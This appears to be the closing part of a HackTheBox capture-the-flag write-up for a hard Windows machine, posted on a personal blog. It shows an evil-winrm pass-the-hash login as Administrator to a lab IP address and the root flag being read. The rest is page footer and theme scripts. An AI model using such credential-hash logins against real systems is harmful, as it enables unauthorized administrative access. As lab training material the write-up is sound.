</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ evil-winrm -u Administrator -H 184fb5e5178480be64824d4cd53b99ee -i 10.10.10.192
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Evil-WinRM shell v2.3
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Info: Establishing connection to remote endpoint
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; gc ../Desktop/root.txt
</span></span><span class=line><span class=cl>511fa0e63117cc3e746a523d0b5fd0b8
</span></span></code></pre></td></tr></table></div></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://s4ch.github.io/tags/ctf/>Ctf</a></li><li><a href=https://s4ch.github.io/tags/hackthebox/>Hackthebox</a></li><li><a href=https://s4ch.github.io/tags/penetration-testing/>Penetration-Testing</a></li><li><a href=https://s4ch.github.io/tags/writeup/>Writeup</a></li><li><a href=https://s4ch.github.io/tags/windows/>Windows</a></li><li><a href=https://s4ch.github.io/tags/hard/>Hard</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://s4ch.github.io/>CyFun</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>